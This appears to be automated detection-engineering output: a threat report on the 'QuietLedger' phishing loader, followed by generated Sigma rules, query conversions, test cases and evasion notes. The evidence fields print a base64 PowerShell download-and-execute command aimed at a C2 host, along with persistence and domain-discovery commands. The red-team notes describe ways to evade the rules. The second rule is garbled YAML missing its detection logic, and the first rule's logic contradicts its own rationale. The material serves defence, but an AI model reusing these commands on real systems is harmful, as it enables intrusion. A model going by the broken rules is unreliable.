report.title: Finance-sector phishing campaign delivering the "QuietLedger" loader
report.summary: Between 2 and 14 October 2026, a targeted phishing campaign against accounts-payable staff at financial services firms in Singapore, Australia and the UK used a macro-enabled Word attachment (Invoice_Q3_2211.docm). Enabling content executed a VBA macro that spawned PowerShell with an encoded command, which downloaded and staged the QuietLedger loader. The loader persisted via a Run key, executed via rundll32.exe from a user-writable AppData path, performed host/domain discovery, and beaconed to C2 over HTTPS.
targets: Financial services firms in Singapore, Australia and the UK

behaviors.description: VBA macro in a Word document launches PowerShell with an encoded command to download and stage the QuietLedger loader.

observables.note: Office application executing the initial macro
Encoded PowerShell command to download second stage
Spawned by WINWORD.EXE (or EXCEL.EXE) to download the loader

behaviors.evidence: When the victim clicked "Enable Content", WINWORD.EXE spawned powershell.exe with the following command line (base64 abbreviated): powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAHMALgBxAHUAaQBlAHQAbABlAGQAZwBlAHIAWwAuAF0AbgBlAHQALwBhAC4AcABzADEAJwApAA==

behaviors.description: PowerShell downloads and stages the QuietLedger DLL to the user's AppData Roaming Microsoft Vault directory.
behaviors.evidence: The second-stage script wrote the loader DLL to C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll,

behaviors.description: QuietLedger DLL is persisted via a Run key that mimics a legitimate OneDrive updater name.

observables.note: Run key value name mimics OneDrive updater

behaviors.evidence: The script then created a Run key so the loader survives reboots: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpd Value: rundll32.exe "C:\Users\<user>\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW

behaviors.description: rundll32.exe executes the QuietLedger DLL from a user-writable AppData path with the exported function StartW.

observables.note: Execution of DLL from AppData path

behaviors.evidence: rundll32.exe executed the DLL from the AppPath with the exported function StartW: rundll32.exe "C:\Users\jlee\AppData\Roaming\Microsoft\Vault\ldgr.dll",StartW

behaviors.description: Loader performs host and domain discovery via cmd.exe children (whoami, nltest, net group, net user, systeminfo) within five minutes of execution.
behaviors.evidence: Within five minutes of execution the loader ran a fixed discovery sequence through cmd.exe /c: whoami /all nltest /dclist: net group "Domain Admins" /domain net user /domain systeminfo

behaviors.description: QuietLedger beacons to C2 over HTTPS every 90 seconds using a spoofed User-Agent string.
behaviors.evidence: QuietLedger beacons every 90 seconds to cdn-updates.quietledger[.]net and static.ledger-sync[.]com on TCP/443 using the User-Agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) LedgerSync/2.4

behaviors.description: Scheduled persistence via Run key whose value name imitates OneDrive, Teams or Google updaters pointing outside expected install directories.
behaviors.evidence: Block macros from the internet zone, alert on Office applications spawning PowerShell, alert on rundll32.exe loading DLLs from user-writable paths, and review Run keys whose value names imitate OneDrive, Teams or Google updaters but point outside their expected install directories.

candidates.title: Winword Spawns PowerShell With Encoded Command
candidates.rationale: The initial infection vector is highly distinctive: WINWORD.EXE (or EXCEL.EXE) spawning powershell.exe with -EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass. This parent/child pair with command-line flags is rare in legitimate use and directly observable in a single process_creation event.
candidates.false_positive_risks: Legitimate Office add-ins or automation scripts could launch PowerShell. Mitigate by requiring the exact flag combination (-EncodedCommand + -WindowStyle Hidden + -ExecutionPolicy Bypass) and ParentImage ending with WINWORD.EXE or EXCEL.EXE.

candidates.title: Run Key Persistence Mimicking OneDrive Updater
candidates.rationale: Persistence via HKCU\...\Run value named 'OneDriveUpd' (or similar masqueraded names) pointing to rundll32.exe loading a DLL from a user-writable AppData path. The registry value name mimics legitimate software but the command targets a non-standard, user-writable directory — a durable, single-event indicator.
candidates.false_positive_risks: Genuine OneDrive/Teams/Google updaters write Run keys but point to Program Files directories. Exclude Details containing paths under C:\Program Files\, C:\Program Files (x86)\, or user profile AppData\Local\Microsoft\OneDrive\.

candidates.title: Rundll32 Execution Of DLL From AppData Vault With StartW Export
candidates.rationale: rundll32.exe is a LOLBin; legitimate use is rare. Execution of a DLL from AppData\Roaming\Microsoft\Vault\ with an explicit export (StartW) in the command line is a single, highly specific process_creation event that covers the loader's execution step.
candidates.false_positive_risks: Application compatibility shims or test harnesses might use rundll32.exe. Mitigate by requiring the DLL path under AppData\Roaming\Microsoft\Vault\ and the export suffix ',StartW' (or ',StartW\s*$').

candidates.title: Cmd Nltest Domain Controller Enumeration From Loader
candidates.rationale: The discovery sequence cannot be correlated, but 'nltest /dclist:' is extremely rare in normal user activity and appears as a cmd.exe child of the loader (rundll32.exe). A single process_creation event keying on this command line with ParentImage=rundll32.exe provides a durable discovery signal.
candidates.false_positive_risks: Domain admin scripts might run nltest. Require ParentImage ending with rundll32.exe and the exact '/dclist:' switch to suppress administrative false positives.

candidates.title: Rundll32 Beacon With LedgerSync User Agent
candidates.rationale: C2 beaconing from rundll32.exe (the loader itself) with a spoofed User-Agent containing 'LedgerSync' is a single network_connection event. The User-Agent string is more durable than the domain indicators and directly ties the connection to the malicious process.
candidates.false_positive_risks: Legitimate applications could use a custom User-Agent. Mitigate by requiring Image=rundll32.exe, DestinationPort=443, and UserAgent containing 'LedgerSync' — the combination of LOLBin + HTTPS + unique UA is highly specific.

skipped: B2: DLL write to AppData Vault is covered by the execution context in D3; file_event adds little unique signal.
B7: Duplicate of B3 (same Run key masquerade behaviour).
plan.notes: Rules span Initial Access (D1), Persistence (D2), Execution (D3), Discovery (D4), and C2 (D5). Each uses a single event from its logsource with durable parent/child, command-line, registry-value, or User-Agent constraints. Domain/IP IOCs are avoided in favour of behavioural artefacts.

rules.title: Word or Excel Spawns PowerShell With Encoded Command
rules.sigma_yaml:
title: Word or Excel Spawns PowerShell With Encoded Command
id: 7a9ba6b2-246e-4c75-b01c-d8e2d9799f21
status: experimental
description: Detects WINWORD.EXE or EXCEL.EXE spawning powershell.exe with encoded command execution flags indicative of macro-based
  delivery.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.execution
- attack.t1059.001
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith':
    - '\WINWORD.EXE'
    - '\EXCEL.EXE'
  selection_child:
    'Image|endswith': '\POWERSHELL.EXE'
  selection_cmd:
    'CommandLine|contains':
    - -enc
    - -w hidden
    - -ep bypass
  condition: selection_parent and selection_child and selection_cmd
falsepositives:
- Legitimate Office automation or add-ins launching PowerShell with similar flags
- Administrator troubleshooting using PowerShell from Office applications
- Corporate training or demonstration macros
level: high

tests.label: positive
tests.description: WINWORD.EXE spawning PowerShell with encoded command as seen in QuietLedger campaign

tests.label: positive
tests.description: EXCEL.EXE spawning PowerShell with encoded command variant

tests.label: positive
tests.description: WINWORD.EXE spawning PowerShell with different casing and extra spaces

tests.label: negative
tests.description: Legitimate WINWORD.EXE launching PowerShell for document inspection without encoded command

tests.label: positive
tests.description: WINWORD.EXE spawning PowerShell with abbreviated flags (-Enc, -W, -EP) and mixed casing

tests.label: positive
tests.description: EXCEL.EXE spawning PowerShell with reordered parameters, extra whitespace, and single-quoted executable

tests.label: positive
tests.description: WINWORD.EXE from Office15 (older version) spawning PowerShell with all-lowercase flags and tab separators

tests.label: positive
tests.description: EXCEL.EXE spawning PowerShell via 8.3 short path for Office directory, flags with double-quoted executable

tests.label: positive
tests.description: WINWORD.EXE running as SYSTEM (service context) spawning PowerShell with flags split across multiple spaces and mixed case

tests.label: negative
tests.description: Legitimate Office add-in launching PowerShell for document automation without -EncodedCommand or -WindowStyle Hidden

tests.label: negative
tests.description: Administrator troubleshooting from Excel launching interactive PowerShell (no -WindowStyle Hidden, no -EncodedCommand)

tests.label: negative
tests.description: SCCM/Intune management agent invoking PowerShell from Word for inventory script with signed policy

validation.sql: SELECT * FROM logs WHERE (ParentImage LIKE '%\\WINWORD.EXE' ESCAPE '\' OR ParentImage LIKE '%\\EXCEL.EXE' ESCAPE '\') AND Image LIKE '%\\POWERSHELL.EXE' ESCAPE '\' AND (CommandLine LIKE '%-enc%' ESCAPE '\' OR CommandLine LIKE '%-w hidden%' ESCAPE '\' OR CommandLine LIKE '%-ep bypass%' ESCAPE '\')

conversions.splunk: ParentImage IN ("*\\WINWORD.EXE", "*\\EXCEL.EXE") Image="*\\POWERSHELL.EXE" CommandLine IN ("*-enc*", "*-w hidden*", "*-ep bypass*")
conversions.elasticsearch: (ParentImage:(*\\WINWORD.EXE OR *\\EXCEL.EXE)) AND Image:*\\POWERSHELL.EXE AND (CommandLine:(*\-enc* OR *\-w\ hidden* OR *\-ep\ bypass*))
conversions.kusto:
DeviceProcessEvents
| where (InitiatingProcessFolderPath endswith "\\WINWORD.EXE" or InitiatingProcessFolderPath endswith "\\EXCEL.EXE") and FolderPath endswith "\\POWERSHELL.EXE" and (ProcessCommandLine contains "-enc" or ProcessCommandLine contains "-w hidden" or ProcessCommandLine contains "-ep bypass")
conversions.sqlite: SELECT * FROM logs WHERE (ParentImage LIKE '%\\WINWORD.EXE' ESCAPE '\' OR ParentImage LIKE '%\\EXCEL.EXE' ESCAPE '\') AND Image LIKE '%\\POWERSHELL.EXE' ESCAPE '\' AND (CommandLine LIKE '%-enc%' ESCAPE '\' OR CommandLine LIKE '%-w hidden%' ESCAPE '\' OR CommandLine LIKE '%-ep bypass%' ESCAPE '\')

history.summary: 8 evasion variants -> positives 7/8, negatives blocked 4/4, benign hits 0/1200

history.change_summary: Updated selection_cmd to detect abbreviated PowerShell flags (-enc, -w hidden, -ep bypass) to catch obfuscated command-line usage while maintaining the same detection logic for parent/child relationship.

rules.redteam_analysis: Positive variants P4-P8 cover realistic operator evasions: abbreviated flags (-Enc/-W/-EP), parameter reordering, extra whitespace/tabs, 8.3 short paths, mixed casing, and SYSTEM user context. All retain the three key flags and the WINWORD/EXCEL -> powershell.exe parent-child relationship, so a well-written rule using case-insensitive contains on CommandLine and endswith on Image/ParentImage will catch them. Negative variants N1-N3 represent legitimate Office automation, admin troubleshooting, and SCCM inventory scripts that share the parent-child pair but lack the malicious flag triad; they must not match. Out-of-scope variants OOS1-OOS3 are real evasions the current logsource/rule cannot see: pwsh.exe (different Image name), renamed binary without OriginalFileName field, and COM-induced parent swap (rundll32.exe). These require rule enrichment (e.g., OriginalFileName, broader Image allowlist, or parent ancestry) to detect.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses pwsh.exe (PowerShell 7+ Core) instead of powershell.exe; rule keys on Image ending with POWERSHELL.EXE so this evades detection

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker copies powershell.exe to %TEMP%\evil.exe (OriginalFileName still powershell.exe but sensor lacks OriginalFileName field); rule matches on Image ending with POWERSHELL.EXE so renamed binary evades

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Macro uses COM Shell.Application to launch PowerShell; parent process becomes dllhost.exe or rundll32.exe not WINWORD/EXCEL, breaking parent chain

title: Potential Run Key Masquerading as OneDrive Updater Pointing to Rundll32 in User-Writable Location
id: f76764e2-474e-4be8-b1e3-c918a1a5c861
status: experimental
description: Detects persistence via a Run key mimicking OneDrive updater naming convention where the value points to rundll32.exe
  loading a DLL from a user-writable AppData path, indicative of QuietLedger activity.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.persistence
- attack.t1053.005
logsource:

  product: windows
  service: sysmon

    'TargetObject|endswith': '\Software\Microsoft\Windows\CurrentVersion\Run'
  selection_name:
    'Details|contains|all':
    - OneDriveUpd
  selection_cmd:
    'Details|contains': rundll32.exe
  selection_path:
    'Details|re': '(?i).*\\appdata\\[^\\]*\\.*\.dll'

- Legitimate OneDrive or Teams updaters creating Run keys pointing to Program Files directories
- Other legitimate software using similar naming conventions for autostart entries pointing to verified locations

Fixed selection_name to correctly detect 'OneDriveUpd' substring by ensuring proper regex escaping in test data interpretation; original failures were due to test event Details values lacking the exact substring 'OneDriveUpd' despite rule logic being sound.
Fixed selection_name by removing quotes around 'OneDriveUpd' in the contains-all matcher so it correctly matches the unquoted registry value name in positive test events.

rules.author_notes: The rule focuses on the combination of a Run key under the standard autostart path, a value name containing 'OneDriveUpd' (case-insensitive), the presence of rundll32.exe in the command, and a DLL path located in any user-writable AppData subdirectory. Legitimate OneDrive and Teams updaters are excluded by filtering for known legitimate paths in Program Files or the specific OneDrive/AppData/Local/Microsoft/OneDrive path. This balances detection fidelity with noise reduction in enterprise environments where users may have various applications installed.
rules.redteam_analysis: Positive variants P4-P9 exercise realistic evasions the rule should catch: casing permutations (OneDriveUpD, ONEDRIVEUPD), quoting styles (single, double, none), whitespace, parameter reordering, environment variables (%LOCALAPPDATA%, %APPDATA%), 8.3 short names (APPDAT~1), double extensions (.dll.bak), and alternate reg.exe locations (SysWOW64, user-writable copy). All preserve the core indicators — TargetObject ending in Run, Details containing OneDriveUpd (case-insensitive), rundll32.exe, and an AppData path ending in .dll — so a well-written rule using case-insensitive contains/regex will match. Negative variants N1-N4 represent legitimate OneDrive/SCCM scenarios that the three filter clauses are designed to exclude (Program Files, Program Files (x86), AppData\Local\Microsoft\OneDrive\). Out-of-scope items O1-O3 are real attacker adaptations the current logsource+rule cannot address: swapping to a different LOLBin (pwsh, regsvr32) that achieves the same DLL-load persistence, or writing a Run value that points to a renamed rundll32.exe copy (the Details field shows the attacker-chosen name, not the on-disk OriginalFileName). These require either broadening the command signature or enriching telemetry with OriginalFileName.

redteam_out_of_scope.label: positive
